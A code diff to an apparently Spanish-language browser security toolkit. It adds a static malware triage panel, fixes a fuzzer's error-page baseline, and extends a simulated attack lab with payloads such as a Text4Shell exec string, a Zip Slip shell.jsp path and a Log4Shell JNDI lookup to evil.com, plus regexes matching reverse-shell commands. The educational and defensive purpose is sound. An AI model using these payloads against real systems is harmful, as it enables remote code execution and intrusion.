@@ -1804,6 +1804,68 @@ section .wrap { position: relative; z-index: 1; }
 .crb-wl-pill.active{border-color:var(--acc);color:var(--acc);background:rgba(255,26,46,.08);font-weight:700;}
 .crb-wl-pill b{font-weight:700;}
 @media(max-width:700px){.crb-wl-pills{gap:6px;}.crb-wl-pill{padding:5px 10px;font-size:10px;}}
+
+/* ══ MEDUSA — Static Malware Triage ══ */
+.md-disclaimer{background:rgba(255,176,32,.06);border:1px solid rgba(255,176,32,.25);border-radius:4px;padding:12px 16px;margin-bottom:22px;font-size:12px;color:rgba(240,238,248,.75);max-width:820px;line-height:1.6;}
+.md-dropzone{border:2px dashed var(--line);border-radius:6px;padding:40px 20px;text-align:center;cursor:pointer;transition:all .2s;background:rgba(255,26,46,.02);}
+.md-dropzone:hover,.md-dropzone.dragover{border-color:var(--acc);background:rgba(255,26,46,.06);box-shadow:0 0 24px rgba(255,26,46,.15);}
+.md-dropzone-icon{font-size:38px;display:block;margin-bottom:12px;}
+.md-dropzone-text{font-family:var(--mono);font-size:13px;color:rgba(240,238,248,.7);}
+.md-dropzone-link{color:var(--acc);text-decoration:underline;}
+.md-dropzone-hint{font-family:var(--mono);font-size:10.5px;color:rgba(240,238,248,.4);margin-top:8px;}
+.md-progress-line{font-family:var(--mono);font-size:12px;color:var(--amber);margin-top:14px;}
+.md-results{margin-top:24px;}
+.md-overview{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:1px;background:var(--line);border:1px solid var(--line);border-radius:4px;overflow:hidden;margin-bottom:20px;}
+.md-ov-cell{background:#0a0610;padding:14px 16px;}
+.md-ov-label{font-family:var(--mono);font-size:9.5px;letter-spacing:.08em;text-transform:uppercase;color:rgba(240,238,248,.4);margin-bottom:6px;display:block;}
+.md-ov-value{font-family:var(--mono);font-size:12.5px;color:var(--text);word-break:break-all;}
+.md-ov-value.hash{font-size:10.5px;color:#8bc99a;}
+.md-risk-cell{grid-column:1/-1;padding:16px;}
+.md-risk-bar-wrap{height:8px;background:rgba(255,255,255,.06);border-radius:4px;overflow:hidden;margin:8px 0 10px;}
+.md-risk-bar{height:100%;border-radius:4px;transition:width .5s;}
+.md-risk-label{font-family:var(--disp);font-weight:900;font-size:15px;letter-spacing:.04em;}
+.md-risk-bajo .md-risk-bar{background:var(--green);}
+.md-risk-bajo .md-risk-label{color:var(--green);}
+.md-risk-medio .md-risk-bar{background:var(--amber);}
+.md-risk-medio .md-risk-label{color:var(--amber);}
+.md-risk-alto .md-risk-bar{background:#ff7a1a;}
+.md-risk-alto .md-risk-label{color:#ff7a1a;}
+.md-risk-critico .md-risk-bar{background:var(--red);}
+.md-risk-critico .md-risk-label{color:var(--red);}
+.md-risk-reasons{list-style:none;margin-top:10px;padding:0;}
+.md-risk-reasons li{font-family:var(--mono);font-size:11.5px;color:rgba(240,238,248,.65);padding:4px 0 4px 16px;position:relative;}
+.md-risk-reasons li::before{content:"▸";position:absolute;left:0;color:var(--acc);}
+.md-tabs{display:flex;gap:2px;border-bottom:1px solid var(--line);margin-bottom:16px;flex-wrap:wrap;}
+.md-tab{font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:.04em;padding:10px 18px;background:transparent;border:none;border-bottom:2px solid transparent;color:rgba(240,238,248,.5);cursor:pointer;transition:all .2s;}
+.md-tab:hover{color:var(--text);}
+.md-tab.active{color:var(--acc);border-bottom-color:var(--acc);}
+.md-tab-panel{display:none;}
+.md-tab-panel.active{display:block;}
+.md-strings-search{width:100%;background:#0a0610;border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:12px;padding:10px 14px;border-radius:3px;margin-bottom:12px;}
+.md-strings-list{max-height:420px;overflow-y:auto;background:#020005;border:1px solid var(--line);border-radius:4px;padding:12px 16px;font-family:var(--mono);font-size:11px;color:#b0c4b8;}
+.md-strings-list div{padding:1px 0;word-break:break-all;white-space:pre-wrap;}
+.md-strings-empty{color:rgba(240,238,248,.35);text-align:center;padding:20px;}
+.md-section-table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11.5px;margin-bottom:18px;}
+.md-section-table th{text-align:left;padding:8px 12px;color:var(--acc);font-size:10px;letter-spacing:.06em;text-transform:uppercase;border-bottom:1px solid var(--line);}
+.md-section-table td{padding:7px 12px;border-bottom:1px solid rgba(255,26,46,.06);}
+.md-section-table tr.md-hot td{color:var(--red);}
+.md-import-group{margin-bottom:14px;}
+.md-import-dll{font-family:var(--mono);font-size:12px;color:var(--violet);font-weight:700;margin-bottom:6px;}
+.md-import-funcs{display:flex;flex-wrap:wrap;gap:6px;}
+.md-import-func{font-family:var(--mono);font-size:10.5px;padding:3px 9px;background:rgba(255,255,255,.04);border:1px solid var(--line);border-radius:3px;color:rgba(240,238,248,.7);}
+.md-import-func.sus{border-color:rgba(255,68,85,.4);color:var(--red);background:rgba(255,26,46,.06);}
+.md-ioc-group{margin-bottom:16px;}
+.md-ioc-label{font-family:var(--mono);font-size:10.5px;letter-spacing:.06em;text-transform:uppercase;color:var(--acc);margin-bottom:8px;display:block;}
+.md-ioc-item{font-family:var(--mono);font-size:11.5px;color:rgba(240,238,248,.75);padding:5px 10px;background:#0a0610;border:1px solid var(--line);border-radius:3px;margin-bottom:4px;word-break:break-all;}
+.md-empty-msg{color:rgba(240,238,248,.35);font-family:var(--mono);font-size:12px;padding:20px;text-align:center;}
+.md-api-cat{margin-bottom:14px;padding:12px 16px;background:rgba(255,26,46,.03);border:1px solid var(--line);border-radius:4px;}
+.md-api-cat-name{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--acc);margin-bottom:6px;}
+@media(max-width:700px){
+  .md-overview{grid-template-columns:1fr;}
+  .md-tabs{overflow-x:auto;flex-wrap:nowrap;}
+  .md-tab{white-space:nowrap;}
+}
+
 @media(max-width:700px){
   .crb-controls-row{flex-direction:column;align-items:flex-start;}
   .crb-table{font-size:10.5px;}
@@ -2284,6 +2346,14 @@ padding:10px 20px;border:1px solid var(--line);background:transparent;color:var(
 .lab-term-dot{width:10px;height:10px;border-radius:50%;}
 .lab-term-dot.r{background:#ff3355;}.lab-term-dot.y{background:#ffb020;}.lab-term-dot.g{background:#00ffa3;}
 .lab-term-body{background:#020005;padding:16px;font-family:var(--mono);font-size:11px;line-height:1.7;min-height:420px;max-height:540px;overflow-y:auto;}
+.lab-term-body{position:relative;}
+.lab-term-body::before{content:'';position:absolute;inset:0;pointer-events:none;z-index:2;
+background:repeating-linear-gradient(0deg,rgba(0,255,163,.025) 0px,rgba(0,255,163,.025) 1px,transparent 1px,transparent 3px);
+mix-blend-mode:overlay;}
+.lab-term-body::after{content:'';position:absolute;left:0;right:0;height:40px;pointer-events:none;z-index:3;
+background:linear-gradient(180deg,rgba(0,255,163,.08),transparent);
+animation:labScanSweep 4.5s linear infinite;opacity:.5;}
+@keyframes labScanSweep{0%{top:-40px;}100%{top:100%;}}
 .lab-term-body::-webkit-scrollbar{width:6px;}
 .lab-term-body::-webkit-scrollbar-thumb{background:rgba(255,26,46,.2);}
 .lab-ln{padding:1px 0;word-break:break-all;}
@@ -2806,6 +2876,7 @@ a{color:inherit;text-decoration:none;}
       <a href="#crawler" class="mega-link">🕸 Endpoint Crawler</a>
       <a href="#kraken" class="mega-link">🐙 Kraken Subdomains</a>
       <a href="#cerberus" class="mega-link">🐺 Cerberus Fuzzer</a>
+      <a href="#medusa" class="mega-link">🐍 Medusa Triage</a>
       <a href="#recon-engine" class="mega-link">◈ Passive Recon Engine</a>
       <a href="#cve-search"   class="mega-link">🛡 CVE Search</a>
       <a href="#warroom"      class="mega-link">⚡ War Room</a>
@@ -3250,6 +3321,48 @@ a{color:inherit;text-decoration:none;}
     </div>
   </div>
 </section>
+<!-- ══ MEDUSA — Static Malware Triage ══ -->
+<section id="medusa">
+  <div class="wrap">
+    <div class="sec-num reveal-wrap"><div class="reveal-inner">28 — Malware Triage</div></div>
+    <h2 class="sec-title h2-anim" data-l1="Medusa" data-l2="Triage." aria-label="Medusa Triage."></h2>
+    <p style="margin-bottom:20px;color:rgba(240,238,248,.6);max-width:720px;">Análisis <strong style="color:var(--acc)">estático</strong> de archivos sospechosos — nunca ejecuta nada. Hashes, tipo real por magic bytes, entropía, strings, indicadores de red, y para ejecutables Windows, estructura PE completa con imports.</p>
+    <p class="md-disclaimer">⚠ Esto NO es un sandbox ni un antivirus. Es triaje: te dice por dónde empezar a mirar, no un veredicto. Un score bajo no significa que el archivo sea seguro — un score alto no confirma que sea malware. El archivo nunca sale de tu navegador: todo el análisis corre en tu máquina.</p>
+
+    <div class="md-dropzone" id="md-dropzone">
+      <input type="file" id="md-file-input" style="display:none;">
+      <div class="md-dropzone-inner">
+        <span class="md-dropzone-icon">🐍</span>
+        <div class="md-dropzone-text">Arrastrá un archivo acá, o <span class="md-dropzone-link">hacé click para elegirlo</span></div>
+        <div class="md-dropzone-hint">Máximo 100 MB — se analiza localmente, nunca se sube a ningún lado</div>
+      </div>
+    </div>
+
+    <div class="md-progress-line" id="md-progress-line" style="display:none;"></div>
+
+    <div class="md-results" id="md-results" style="display:none;">
+
+      <div class="md-overview" id="md-overview"></div>
+
+      <div class="md-tabs">
+        <button class="md-tab active" data-tab="strings">Strings</button>
+        <button class="md-tab" data-tab="pe">Estructura PE</button>
+        <button class="md-tab" data-tab="iocs">Indicadores</button>
+        <button class="md-tab" data-tab="apis">APIs sospechosas</button>
+      </div>
+
+      <div class="md-tab-panel active" id="md-panel-strings">
+        <input type="text" id="md-strings-filter" class="md-strings-search" placeholder="Filtrar strings...">
+        <div class="md-strings-list" id="md-strings-list"></div>
+      </div>
+      <div class="md-tab-panel" id="md-panel-pe"></div>
+      <div class="md-tab-panel" id="md-panel-iocs"></div>
+      <div class="md-tab-panel" id="md-panel-apis"></div>
+
+    </div>
+  </div>
+</section>
+
 
 
 
@@ -11214,6 +11327,7 @@ var NAV_ITEMS = [
  {id:'crawler',      icon:'\uD83D\uDD78',  label:'Endpoint Crawler'},
  {id:'kraken',       icon:'\uD83D\uDC19',  label:'Kraken Subdomains'},
  {id:'cerberus',     icon:'\uD83D\uDC3A',  label:'Cerberus Fuzzer'},
+ {id:'medusa',       icon:'\uD83D\uDC0D',  label:'Medusa Triage'},
  {id:'recon-engine', icon:'\u25C8',        label:'Passive Recon Engine'},
  {id:'cve-search',   icon:'\uD83D\uDEE1',  label:'CVE Search'},
  {id:'warroom',      icon:'\u26A1',        label:'War Room'},
@@ -13693,6 +13807,11 @@ var P=[
 {id:"deser1",w:"inj",c:"deser",n:"Java Deserialization (RCE)",sv:"crit",sl:"CRITICAL",i:"admin",p:"rO0ABXNyABFqYXZhLnV0aWwuTGludCk/",d:1,wm:"Deserializacion insegura -> RCE sin credenciales",v:"deser"},
 {id:"proto1",w:"inj",c:"injx",n:"Prototype Pollution (Node.js)",sv:"crit",sl:"CRITICAL",i:"admin",p:'{"__proto__": {"isAdmin": true}}',d:1,wm:"Contaminacion de prototipos -> escalada de privilegios",v:"proto"},
 {id:"log4j1",w:"inj",c:"injx",n:"Log4Shell (JNDI RCE)",sv:"crit",sl:"CRITICAL",i:"admin",p:"${jndi:ldap://evil.com/a}",d:1,wm:"RCE via Log4j JNDI lookup - CVE-2021-44228",v:"log4j"},
+{id:"text4shell1",w:"inj",c:"injx",n:"Text4Shell (Apache Commons Text RCE)",sv:"crit",sl:"CRITICAL",i:"admin",p:"${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",v:"text4shell"},
+{id:"zipslip1",w:"inj",c:"lfi",n:"Zip Slip (Archivo Extraction Traversal)",sv:"high",sl:"HIGH",i:"admin",p:"../../../../var/www/html/shell.jsp",v:"zipslip"},
+{id:"depconf1",w:"cloud",c:"deps",n:"Dependency Confusion (npm/pip)",sv:"crit",sl:"CRITICAL",i:"admin",p:"internal-auth-lib@99.99.99 (registro publico prioriza version mas alta)",v:"dep_confusion"},
+{id:"h2reset1",w:"headers",c:"hdr",n:"HTTP/2 Rapid Reset (CVE-2023-44487)",sv:"high",sl:"HIGH",i:"admin",p:"RST_STREAM x 50000 (stream 1,3,5,7...)",v:"h2_reset"},
+{id:"cachedec1",w:"headers",c:"hdr",n:"Cache Deception (path confusion)",sv:"high",sl:"HIGH",i:"admin",p:"/account/settings/nonexistent.css",v:"cache_deception"},
 {id:"ognl1",w:"inj",c:"injx",n:"OGNL Injection (Struts2)",sv:"crit",sl:"CRITICAL",i:"admin",p:"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}",d:1,wm:"RCE via OGNL - CVE-2017-5638",v:"ognl"},
 {id:"gql1",w:"api",c:"gql",n:"GraphQL Introspection",sv:"high",sl:"HIGH",i:"/graphql",p:"{__schema{types{name fields{name type{name}}}}",v:"gql_intro"},
 {id:"gql2",w:"api",c:"gql",n:"GraphQL Field Suggestion",sv:"med",sl:"MEDIUM",i:"/graphql",p:"{user{emal}}",v:"gql_suggest"},
@@ -14071,6 +14190,12 @@ RF.xxe_blind=function(u,p,o){det(o,"XXE Blind (OOB)");o.push(ln("[dns] evil.com.
 RF.deser=function(u,p,o){det(o,"Java Deserialization");o.push(ln("[+] ysoserial -> CommonsCollections1","amber"));ok(o,"RCE via gadget chain. uid=0(root)");};
 RF.proto=function(u,p,o){det(o,"Prototype Pollution");dtl(o,"__proto__.isAdmin=true");ok(o,"Bypass autorizacion.");};
 RF.log4j=function(u,p,o){det(o,"Log4Shell (Log4j JNDI)");o.push(ln("[server] ${jndi:ldap://evil.com/a}","white"));o.push(ln("[ldap] Connection from target","green-bright"));ok(o,"RCE via JNDI lookup.");o.push(ln("[i] CVE-2021-44228.","amber"));};
+RF.text4shell=function(u,p,o){det(o,"Text4Shell (Apache Commons Text RCE)");o.push(ln("[server] StringSubstitutor.replace() evalua \${script:...}","white"));o.push(ln("[jvm] javax.script.ScriptEngine -> nashorn","white"));o.push(ln("[OK] uid=33(www-data)","green-bright"));ok(o,"RCE via interpolacion de script.");o.push(ln("[i] CVE-2022-42889.","amber"));};
+RF.zipslip=function(u,p,o){det(o,"Zip Slip — Archive Extraction Path Traversal");o.push(ln("[server] unzip(upload.zip) sin sanitizar nombres de entrada","white"));o.push(ln("[+] Entrada maliciosa: ../../../../var/www/html/shell.jsp","amber"));o.push(ln("[OK] shell.jsp escrito fuera del directorio de extraccion","green-bright"));ok(o,"RCE via archivo escrito fuera del sandbox.");o.push(ln("[i] CWE-22 — afecto librerias como java.util.zip antes de validacion.","amber"));};
+RF.dep_confusion=function(u,p,o){det(o,"Dependency Confusion — Registro publico vs interno");o.push(ln("[npm] Paquete 'internal-auth-lib' NO existe en el registro publico","white"));o.push(ln("[atacante] Publica 'internal-auth-lib@99.99.99' en npm publico","amber"));o.push(ln("[ci/cd] Build pipeline resuelve la version MAS ALTA disponible -> publica","red"));o.push(ln("[OK] Codigo del atacante ejecutado en el pipeline de build interno","green-bright"));ok(o,"RCE en infraestructura de CI/CD via paquete suplantado.");o.push(ln("[i] Tecnica documentada por Alex Birsan (2021).","amber"));};
+RF.h2_reset=function(u,p,o){det(o,"HTTP/2 Rapid Reset — Stream Multiplexing Abuse");o.push(ln("[client] Abre stream -> envia RST_STREAM inmediato -> repite miles de veces","white"));o.push(ln("[server] Cada stream consume recursos de procesamiento antes del reset","amber"));o.push(ln("[server] Pool de workers agotado — 50000 streams/seg","red"));ok(o,"Denegacion de servicio confirmada (recursos del servidor agotados).");o.push(ln("[i] CVE-2023-44487 — afecto a la mayoria de servidores HTTP/2 en 2023.","amber"));};
+RF.cache_deception=function(u,p,o){det(o,"Web Cache Deception — Path Confusion");o.push(ln("[client] GET /account/settings/nonexistent.css","white"));o.push(ln("[server] Devuelve la pagina de /account/settings (ignora el sufijo .css)","white"));o.push(ln("[cdn] Cachea la respuesta por la extension .css (asume contenido estatico)","amber"));o.push(ln("[atacante] Pide la misma URL sin sesion -> recibe la pagina cacheada con datos de otro usuario","red"));ok(o,"Datos de sesion ajena expuestos via cache mal configurado.");o.push(ln("[i] Distinto de Cache Poisoning: aca el engaño esta en que se cachea, no en que se envenena.","amber"));};
+
 RF.ognl=function(u,p,o){det(o,"OGNL Injection (Struts2)");o.push(ln("[struts] OGNL expression evaluada","white"));ok(o,"uid=0(root)");o.push(ln("[i] CVE-2017-5638.","amber"));};
 
 RF.gql_intro=function(u,p,o){det(o,"GraphQL Introspection");ok(o,"Schema:");o.push(ln("type User { id email role password api_key: String! }","white"));o.push(ln("Mutation { deleteUser(id:ID!): Boolean <- sin auth!","amber"));};
@@ -14234,6 +14359,11 @@ function detectVec(){
  if(/<!doctype|<!entity|file:\/\/|&x;/.test(b))return"xxe";
  if(/__proto__/.test(b))return"proto";
  if(/jndi:/.test(b))return"log4j";
+ if(/script:javascript|script:nashorn|stringsubstitutor/i.test(b))return"text4shell";
+ if(/\.\.\/.*\.(jsp|war|jar|class)$/i.test(b)&&/\.\.\/\.\.\//.test(b))return"zipslip";
+ if(/registro publico prioriza|dependency.?confusion|@99\.99\.99/i.test(b))return"dep_confusion";
+ if(/rst_stream|rapid.?reset/i.test(b))return"h2_reset";
+ if(/nonexistent\.(css|js|jpg|png)$/i.test(b))return"cache_deception";
  if(/ognl/.test(b))return"ognl";
  if(/rO0ABX/.test(b))return"deser";
  if(/bash -i.*\/dev\/tcp|pty\.spawn|dup2|perl.*socket|ruby.*socket|mkfifo.*nc/.test(b))return"rce_rev";
@@ -14547,18 +14677,43 @@ if(plist)if(plist)plist.addEventListener("click",function(e){
 if(in1)if(in1)in1.addEventListener("input",function(){curVec=null;});
 if(in2)if(in2)in2.addEventListener("input",function(){curVec=null;});
 
+var LAB_SCRAMBLE_CHARS='!<>-_\\/[]{}—=+*^?#$%01';
+function labScrambleReveal(el,finalText,duration){
+ if(!finalText||!finalText.trim()){el.textContent=finalText;return;}
+ var totalFrames=Math.max(6,Math.floor(duration/35));
+ var frame=0;
+ var iv=setInterval(function(){
+ frame++;
+ var revealCount=Math.floor((frame/totalFrames)*finalText.length);
+ var out='';
+ for(var i=0;i<finalText.length;i++){
+ if(i<revealCount||finalText[i]===' ')out+=finalText[i];
+ else out+=LAB_SCRAMBLE_CHARS[Math.floor(Math.random()*LAB_SCRAMBLE_CHARS.length)];
+ }
+ el.textContent=out;
+ if(frame>=totalFrames){el.textContent=finalText;clearInterval(iv);}
+ },35);
+}
 function typeLine(lines){
- /* Bug real: cada "linea" ya viene como HTML completo desde ln()/ok()/det()/dtl()
-    (ej. '<div class="lab-ln ok">[OK] mensaje</div>'), pero se insertaba via
-    textContent — eso muestra las etiquetas como texto literal en pantalla y
-    anula CUALQUIER color (ok/blue/amber/red), no solo el verde de exito.
-    u/p ya vienen escapados con esc() antes de llegar aca (ver respond()), asi
-    que renderizar como HTML real es seguro. */
+ /* Bug real (ya corregido): cada "linea" viene como HTML completo desde
+    ln()/ok()/det()/dtl() — se renderiza como HTML de verdad, no como texto.
+    u/p ya vienen escapados con esc() antes de llegar aca, asi que es seguro.
+    Efecto nuevo: cada linea aparece con un "descifrado" tipo Matrix — texto
+    scrambled que se resuelve caracter por caracter en el texto real, en vez
+    de aparecer de una. El color (clase CSS) se preserva intacto. */
  termBody.innerHTML="";var i=0;
  function step(){
  if(i>=lines.length){termBody.insertAdjacentHTML("beforeend",'<div class="lab-ln"><span class="lab-cursor"></span></div>');return;}
- termBody.insertAdjacentHTML("beforeend", lines[i]);
- termBody.scrollTop=termBody.scrollHeight;i++;setTimeout(step,70);
+ var wrap=document.createElement('div');
+ wrap.innerHTML=lines[i];
+ var lineEl=wrap.firstElementChild;
+ if(lineEl){
+ var finalText=lineEl.textContent;
+ lineEl.textContent='';
+ termBody.appendChild(lineEl);
+ labScrambleReveal(lineEl,finalText,180);
+ }
+ termBody.scrollTop=termBody.scrollHeight;i++;setTimeout(step,75);
  }
  step();
 }
@@ -23051,20 +23206,31 @@ async function crbFetch(url, timeoutMs) {
    Se guarda status/longitud/titulo — cualquier hallazgo posterior con el
    MISMO patron se descarta automaticamente (soft-404 disfrazado de 200). */
 async function crbCalibrateBaseline(target) {
-  const probe = target.replace(/\/$/, '') + '/probe-404-' + Math.random().toString(36).slice(2, 10);
-  const t0 = performance.now();
-  const res = await crbFetch(probe, 10000);
-  const elapsed = performance.now() - t0;
-  if (!res) return { status: 0, len: 0, title: '', hash: 0, rtt: elapsed };
-  const body = res.body || '';
-  const titleMatch = body.match(/<title[^>]*>([^<]*)<\/title>/i);
-  return {
-    status: res.status || 0,
-    len: body.length,
-    title: titleMatch ? titleMatch[1].trim() : '',
-    hash: crbHash(body.slice(0, 500)),
-    rtt: elapsed,
-  };
+  /* Bug real: una UNICA peticion de baseline que fallara (timeout, blip de red)
+     dejaba baseline.status en 0, y con status 0 el filtro entero se desactivaba
+     para el resto de la corrida — asi termina el usuario viendo 5000 "hallazgos"
+     que en realidad son la misma pagina de error repetida. Ahora se reintenta
+     hasta 3 veces (con paths de prueba distintos) antes de rendirse. */
+  for (let attempt = 0; attempt < 3; attempt++) {
+    const probe = target.replace(/\/$/, '') + '/probe-404-' + Math.random().toString(36).slice(2, 10);
+    const t0 = performance.now();
+    const res = await crbFetch(probe, 10000);
+    const elapsed = performance.now() - t0;
+    if (res && res.status > 0) {
+      const body = res.body || '';
+      const titleMatch = body.match(/<title[^>]*>([^<]*)<\/title>/i);
+      return {
+        status: res.status,
+        len: body.length,
+        title: titleMatch ? titleMatch[1].trim() : '',
+        hash: crbHash(body.slice(0, 500)),
+        rtt: elapsed,
+        confirmed: true,
+      };
+    }
+    if (attempt < 2) await crbSleep(400);
+  }
+  return { status: 0, len: 0, title: '', hash: 0, rtt: 0, confirmed: false };
 }
 
 function crbHash(s) {
@@ -23186,10 +23352,38 @@ async function crbStart() {
   crb.baseline = await crbCalibrateBaseline(target);
   if (crb.cancelled) return crbFinish('cancelado durante calibracion');
 
-  $c('crb-status-line').textContent =
-    'Baseline: status ' + crb.baseline.status + ', ' + crb.baseline.len + ' bytes' +
-    (crb.baseline.title ? ', titulo "' + crb.baseline.title + '"' : '') +
-    '. Fuzzing ' + wordlist.label + ' (' + crb.totalCount + ' rutas)...';
+  if (crb.baseline.confirmed) {
+    $c('crb-status-line').textContent =
+      'Baseline: status ' + crb.baseline.status + ', ' + crb.baseline.len + ' bytes' +
+      (crb.baseline.title ? ', titulo "' + crb.baseline.title + '"' : '') +
+      '. Fuzzing ' + wordlist.label + ' (' + crb.totalCount + ' rutas)...';
+  } else {
+    $c('crb-status-line').textContent =
+      '⚠ No se pudo calibrar el baseline (el target no respondio tras 3 intentos) — ' +
+      'detectando patron de error automaticamente con las primeras respuestas...';
+  }
+
+  /* Respaldo dinamico: si el baseline fijo no se pudo confirmar (target parece
+     no responder), NO se apaga el filtro entero (ese era el bug real) — en vez
+     de eso se juntan las primeras respuestas y, si una combinacion status+tamaño
+     se repite en la mayoria de ellas, esa combinacion se promueve a baseline
+     sobre la marcha, se filtran retroactivamente los buffers y se sigue
+     filtrando normal para el resto de la corrida. */
+  var pendingBuffer = [];
+  var dynamicResolved = crb.baseline.confirmed;
+
+  function flushBuffer(withBaseline) {
+    pendingBuffer.forEach(function (item) {
+      if (withBaseline && crbMatchesBaseline(item.res, crb.baseline)) return;
+      const entry = { status: item.res.status, path: item.path, size: (item.res.body || '').length, rtt: item.rtt };
+      crb.results.push(entry);
+      crbAddResultRow(entry);
+      if (item.res.status >= 200 && item.res.status < 300) crb.hits['2xx']++;
+      else if (item.res.status >= 300 && item.res.status < 400) crb.hits['3xx']++;
+      else if (item.res.status === 401 || item.res.status === 403) crb.hits['403']++;
+    });
+    pendingBuffer = [];
+  }
 
   await crbPool(wordlist.paths, crb.concurrency, crb.delayMs, async (path) => {
     const url = target + path;
@@ -23198,16 +23392,51 @@ async function crbStart() {
     const rtt = Math.round(performance.now() - t0);
     crb.doneCount++;
 
-    if (res && res.status > 0 && !crbMatchesBaseline(res, crb.baseline)) {
-      const entry = { status: res.status, path: path, size: (res.body || '').length, rtt: rtt };
-      crb.results.push(entry);
-      crbAddResultRow(entry);
-      if (res.status >= 200 && res.status < 300) crb.hits['2xx']++;
-      else if (res.status >= 300 && res.status < 400) crb.hits['3xx']++;
-      else if (res.status === 401 || res.status === 403) crb.hits['403']++;
+    if (res && res.status > 0) {
+      if (dynamicResolved) {
+        if (!crbMatchesBaseline(res, crb.baseline)) {
+          const entry = { status: res.status, path: path, size: (res.body || '').length, rtt: rtt };
+          crb.results.push(entry);
+          crbAddResultRow(entry);
+          if (res.status >= 200 && res.status < 300) crb.hits['2xx']++;
+          else if (res.status >= 300 && res.status < 400) crb.hits['3xx']++;
+          else if (res.status === 401 || res.status === 403) crb.hits['403']++;
+        }
+      } else {
+        pendingBuffer.push({ res: res, path: path, rtt: rtt });
+        if (pendingBuffer.length >= 12) {
+          const freq = {};
+          pendingBuffer.forEach(function (item) {
+            const key = item.res.status + ':' + (item.res.body || '').length;
+            freq[key] = (freq[key] || 0) + 1;
+          });
+          const best = Object.keys(freq).reduce(function (a, b) { return freq[a] >= freq[b] ? a : b; });
+          if (freq[best] / pendingBuffer.length >= 0.7) {
+            const sample = pendingBuffer.find(function (item) { return (item.res.status + ':' + (item.res.body || '').length) === best; });
+            crb.baseline = {
+              status: sample.res.status, len: (sample.res.body || '').length,
+              title: '', hash: crbHash((sample.res.body || '').slice(0, 500)),
+              rtt: 0, confirmed: true, dynamic: true,
+            };
+            $c('crb-status-line').textContent =
+              '⚠ Patron de error detectado automaticamente: status ' + crb.baseline.status + ', ' + crb.baseline.len +
+              ' bytes (se repitio en ' + freq[best] + ' de las primeras ' + pendingBuffer.length + ' respuestas) — filtrando desde aca.';
+            flushBuffer(true);
+          } else {
+            flushBuffer(false);
+          }
+          dynamicResolved = true;
+        }
+      }
     }
     if (crb.doneCount % 5 === 0 || crb.doneCount === crb.totalCount) crbUpdateProgress();
   });
+
+  /* Si la corrida termino (wordlist chica o cancelacion) antes de juntar las
+     12 muestras necesarias para detectar el patron dinamico, no se pierden:
+     se vuelcan tal cual como hallazgos genuinos (mejor mostrar de mas que
+     perder resultados reales por falta de muestra). */
+  if (!dynamicResolved && pendingBuffer.length) flushBuffer(false);
 
   if (crb.cancelled) return crbFinish('cancelado por el usuario');
   crbFinish('completo');
@@ -23333,6 +23562,546 @@ window.tudelaSecFuzzTarget = function(url, category, autostart){
   if(sec && sec.scrollIntoView) sec.scrollIntoView({ behavior:'smooth', block:'start' });
   if(autostart) setTimeout(crbStart, 550);
 };
+
+})();
+
+/* ══ MEDUSA — Static Malware Triage ══ */
+(function(){
+'use strict';
+/* ══════════════════════════════════════════════════════════════════
+   MEDUSA — Motor de Triaje Estatico de Malware
+   Solo analisis ESTATICO: nunca ejecuta, nunca hace eval(), nunca
+   interpreta el archivo como codigo. Toda salida se escapa antes de
+   renderizar (el archivo analizado es HOSTIL por definicion).
+   ══════════════════════════════════════════════════════════════════ */
+
+/* ── [HASHES] ───────────────────────────────────────────────────── */
+async function mdSha256(buf) {
+  const hash = await crypto.subtle.digest('SHA-256', buf);
+  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
+}
+async function mdSha1(buf) {
+  const hash = await crypto.subtle.digest('SHA-1', buf);
+  return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
+}
+/* MD5 — Web Crypto no lo soporta (deprecado por inseguro para firmas,
+   pero AUN es el hash mas buscado en bases de malware/VT), implementacion
+   manual RFC 1321. */
+function mdMd5(buf) {
+  const bytes = new Uint8Array(buf);
+  function rotl(x, c) { return (x << c) | (x >>> (32 - c)); }
+  const K = new Int32Array([
+    -680876936,-389564586,606105819,-1044525330,-176418897,1200080426,-1473231341,-45705983,
+    1770035416,-1958414417,-42063,-1990404162,1804603682,-40341101,-1502002290,1236535329,
+    -165796510,-1069501632,643717713,-373897302,-701558691,38016083,-660478335,-405537848,
+    568446438,-1019803690,-187363961,1163531501,-1444681467,-51403784,1735328473,-1926607734,
+    -378558,-2022574463,1839030562,-35309556,-1530992060,1272893353,-155497632,-1094730640,
+    681279174,-358537222,-722521979,76029189,-640364487,-421815835,530742520,-995338651,
+    -198630844,1126891415,-1416354905,-57434055,1700485571,-1894986606,-1051523,-2054922799,
+    1873313359,-30611744,-1560198380,1309151649,-145523070,-1120210379,718787259,-343485551]);
+  const S = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,
+             5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,
+             4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,
+             6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
+  const origLen = bytes.length;
+  const withOne = new Uint8Array(((origLen + 8) >> 6) * 64 + 64);
+  withOne.set(bytes);
+  withOne[origLen] = 0x80;
+  const bitLen = origLen * 8;
+  const dv = new DataView(withOne.buffer);
+  dv.setUint32(withOne.length - 8, bitLen >>> 0, true);
+  dv.setUint32(withOne.length - 4, Math.floor(bitLen / 4294967296), true);
+  let a0 = 0x67452301, b0 = 0xefcdab89 | 0, c0 = 0x98badcfe | 0, d0 = 0x10325476;
+  for (let off = 0; off < withOne.length; off += 64) {
+    const M = new Int32Array(16);
+    for (let j = 0; j < 16; j++) M[j] = dv.getInt32(off + j * 4, true);
+    let A = a0, B = b0, C = c0, D = d0;
+    for (let i = 0; i < 64; i++) {
+      let F, g;
+      if (i < 16) { F = (B & C) | (~B & D); g = i; }
+      else if (i < 32) { F = (D & B) | (~D & C); g = (5 * i + 1) % 16; }
+      else if (i < 48) { F = B ^ C ^ D; g = (3 * i + 5) % 16; }
+      else { F = C ^ (B | ~D); g = (7 * i) % 16; }
+      F = (F + A + K[i] + M[g]) | 0;
+      A = D; D = C; C = B;
+      B = (B + rotl(F, S[i])) | 0;
+    }
